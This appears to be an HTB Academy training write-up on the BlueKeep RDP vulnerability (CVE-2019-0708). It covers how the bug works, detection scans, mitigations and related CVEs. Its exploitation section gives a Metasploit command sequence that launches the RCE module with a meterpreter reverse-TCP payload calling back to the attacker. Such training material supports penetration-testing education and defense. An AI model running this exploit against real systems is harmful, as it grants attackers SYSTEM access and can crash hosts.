# Latest RDP Vulnerabilities — BlueKeep (CVE-2019-0708)

> HTB Academy · Attacking Common Services · Section 12 / 19
> Companion to [11-Attacking_RDP.md](11-Attacking_RDP.md)

---

## TL;DR

| Field | Value |
|-------|-------|
| CVE | **CVE-2019-0708** |
| Name | BlueKeep |
| Service / Port | RDP / TCP **3389** |
| Class | Pre-auth Use-After-Free → kernel RCE |
| Privilege Gained | `NT AUTHORITY\SYSTEM` |
| Authentication Required | **No** |
| User Interaction | **None** |
| Affected | Win 7, Win Server 2008 / 2008 R2, Win Server 2003, Windows XP |
| Patched | Microsoft pushed out-of-band fixes May 2019 (incl. EoL editions) |
| Stability | Public exploits frequently BSoD the target — use with care |

---

## Why It Matters

- Pre-authentication, no-click, kernel-level RCE on a service Microsoft historically loved to expose to the internet.
- Initial Internet scan (May 2019) found ~950k vulnerable hosts; ~25% remained unpatched into the years following.
- Hospitals, OT/ICS, and legacy enterprise apps locked to specific OS versions are still over-represented in the long tail of unpatched targets.

---

## The Vulnerability — How It Works

BlueKeep lives in the **`MS_T120` virtual channel**, an internal RDP channel that should never be addressable by name from a client. The pre-auth handshake sequence:

1. Client opens an RDP connection.
2. During the **MCS (Multipoint Communication Service)** channel negotiation, the client requests a virtual channel named `MS_T120`.
3. The server accepts the request and binds the attacker-controlled channel to the **same internal channel ID (31)** the kernel already uses for `MS_T120`.
4. When the client closes the connection, both bindings free the **same channel object** → classic **Use-After-Free**.
5. Attacker grooms the non-paged pool, reclaims the freed object with controlled data, and steers a function pointer / callback into shellcode.
6. Code executes inside `termdd.sys` (kernel driver) → **SYSTEM**.

### Source / Process / Privileges / Destination Mapping

#### Phase 1 — Initiation

| # | Element | BlueKeep Mapping |
|---|---------|------------------|
| 1 | Source | Manipulated MCS Connect-Initial PDU containing duplicate `MS_T120` channel request |
| 2 | Process | Channel-creation routine that registers the virtual channel (UAF lives here) |
| 3 | Privileges | RDP service runs as **LocalSystem**, so the buggy code is in a SYSTEM-privileged process |
| 4 | Destination | Kernel-mode `termdd.sys` driver |

#### Phase 2 — Trigger RCE

| # | Element | BlueKeep Mapping |
|---|---------|------------------|
| 5 | Source | Heap-spray payload sized to reclaim the freed channel object with attacker-controlled bytes |
| 6 | Process | Disconnect provider indication frees the object, then a later channel close dereferences attacker-controlled vtable |
| 7 | Privileges | Execution lands in kernel context → **SYSTEM** |
| 8 | Destination | Shellcode launches a reverse shell / stager back to the attacker over the network |

---

## Detection

### Pre-auth Probes (Safe — No Crash Risk)

```bash
# Nmap NSE
nmap -sV -p3389 --script rdp-vuln-ms12-020,rdp-ntlm-info <target>

# BlueKeep-specific NSE (community)
nmap -p3389 --script rdp-vuln-cve2019-0708 <target>

# Metasploit auxiliary scanner
msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf6 auxiliary(...) > set RHOSTS <target>
msf6 auxiliary(...) > run
# Possible verdicts: Vulnerable / Patched / Requires NLA / Unknown

# nxc
nxc rdp <target>            # banner, NLA status, and OS info
```
> Replace `<target>` with the target IP. These scanners are non-destructive — use them for triage before deciding whether to fire the exploit. NLA-required hosts are not vulnerable pre-auth.

NLA-required hosts cannot be exploited pre-auth — useful triage.

---

## Exploitation

### Public PoCs

| Source | Notes |
|--------|-------|
| `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` (Metasploit) | Targets x64 Win 7 / Server 2008 R2; tunable `GROOMSIZE` / `GROOMBASE` |
| zerosum0x0 / Worawit Wang public PoCs | Reference for the UAF + heap-spray |

### Metasploit Workflow

```
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 exploit(...) > set RHOSTS 10.10.10.10
msf6 exploit(...) > set RPORT 3389
msf6 exploit(...) > set TARGET 2          # 2 = Windows 7 SP1 / 2008 R2 (Virtualbox/HyperV variants 3-7)
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST tun0
msf6 exploit(...) > check
msf6 exploit(...) > exploit
```
> Always run `check` before `exploit` to confirm vulnerability without detonating. Set `TARGET` to match the exact OS/hypervisor — wrong value will BSoD the host. Replace the IP and LHOST with your values.

Tuning knobs:

- `TARGET` — pick the right hypervisor / hardware profile; wrong target = guaranteed BSoD.
- `GROOMBASE` / `GROOMSIZE` — heap groom geometry; defaults often need tweaking.

### Tooling Caveats

- **Crashes are common.** Exploits assume specific NPP layout — under load or with different patch levels they bluescreen the host.
- **Always confirm with scope.** Get written approval before launching destructive primitives. Document blast radius (loss of availability, data corruption) in pre-engagement.

---

## Defense / Mitigations

| Control | Effect |
|---------|--------|
| Apply MS May-2019 KB | Direct fix — patch the channel-binding logic |
| Enable **Network Level Authentication (NLA)** | Pre-auth surface gone — exploit needs valid credentials |
| Disable RDP if not needed (`Set-Service TermService -StartupType Disabled`) | Removes the service entirely |
| Firewall TCP/3389 from internet; require VPN / RD Gateway / ZTNA | Removes the attacker's ability to reach the port |
| Network segmentation | Limits lateral spread if a single host is compromised |
| Endpoint detection (Defender, EDR) | Detects shellcode / kernel-stage payloads, plus suspicious RDP traffic patterns |
| Monitor `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS` events 131 / 140 | Anomalous channel creations / repeated disconnects |

---

## Variants & Related RDP CVEs

| CVE | Name | Notes |
|-----|------|-------|
| CVE-2019-0708 | BlueKeep | Pre-auth UAF, RCE |
| CVE-2019-1181 / 1182 / 1222 / 1226 | DejaBlue | Wormable RCE chain in Win 7+ RDP, post-BlueKeep cleanup |
| CVE-2012-0002 | MS12-020 | Pre-BlueKeep RDP DoS / RCE primitive (mostly DoS in practice) |
| CVE-2022-21893 / 21990 | RDP Client RCEs | Roles reversed — malicious server attacks the connecting client |

---

## Operator Notes

- BlueKeep is a "yes/no" capability check — don't fire the live exploit just because the scanner flags vulnerable. Talk to the client.
- For triage at scale, prefer the Metasploit aux scanner or the community NSE script over running the RCE module.
- After patching cycles in 2019–2020 most Internet-facing Win 7 / 2008 R2 boxes were either patched or wormed (BlueKeep cryptominer wave). Internal networks are where it still hits today.
- BlueKeep teaches a recurring pattern: **pre-auth, no-interaction, network-reachable, kernel-privileged service** = catastrophic. Look for the same shape in future advisories (e.g. SMBGhost, PrintNightmare).

## Key Takeaways

- BlueKeep (CVE-2019-0708) is a pre-auth UAF in the RDP `MS_T120` channel that yields kernel/SYSTEM RCE on legacy Windows.
- Detect with `nmap --script rdp-vuln-cve2019-0708` or Metasploit's `cve_2019_0708_bluekeep` aux scanner — these are non-destructive.
- Exploitation modules are **unstable** — wrong target profile or grooming = BSoD. Mandatory client sign-off before triggering.
- NLA + patching + RDP-not-on-the-internet kill this entire vector — the standard RDP hardening trio.
